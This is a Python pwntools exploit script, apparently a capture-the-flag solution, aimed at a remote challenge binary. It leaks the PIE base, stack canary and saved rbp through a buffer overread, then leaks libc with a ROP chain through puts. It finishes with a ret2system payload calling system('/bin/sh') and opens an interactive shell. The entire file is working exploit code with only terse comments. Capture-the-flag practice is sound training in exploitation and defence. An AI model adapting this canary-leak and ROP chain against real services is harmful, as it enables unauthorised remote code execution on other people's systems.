#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("chall.k1nd4sus.it", 30501)
    return r


def main():
    r = conn()

    # Leak PIE
    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"string: ", b"A" * 256)
    r.recvuntil(b"A" * 256)
    leak = r.recvline().strip()
    exe.address = u64(leak[:8].ljust(8, b"\x00")) - exe.sym._start
    log.info(f"PIE: 0x{exe.address:x}")

    # Leak canary
    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"string: ", b"A" * 263 + b"%")
    r.recvuntil(b"%%")
    leak = r.recvline().strip()
    canary, rbp = u64(leak[:8]), u64(leak[8:].ljust(8, b"\x00"))
    log.info(f"canary: 0x{canary:x}")
    log.info(f"rbp: 0x{rbp:x}")

    pop_rdi = ROP(exe).find_gadget(['pop rdi', 'ret'])[0]
    ret     = pop_rdi + 1

    payload = flat(
            b"%" * 132,
            canary,
            b"B" * 8,
            pop_rdi,
            exe.got.puts,
            exe.plt.puts,
            exe.sym.main
        )

    # Leak libc
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"string: ", payload)
    leak = r.recvlines(2)[-1].strip(b"\n")
    libc.address = u64(leak.ljust(8, b"\x00")) - libc.symbols["puts"]
    log.info(f"libc: 0x{libc.address:x}")

    payload = flat(
        b"%" * 132,
        canary,
        b"B" * 8,
        pop_rdi,
        libc.search(b"/bin/sh\x00").__next__(),
        ret,
        libc.sym.system
    )

    # Perform ret2system
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"string: ", payload)
    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
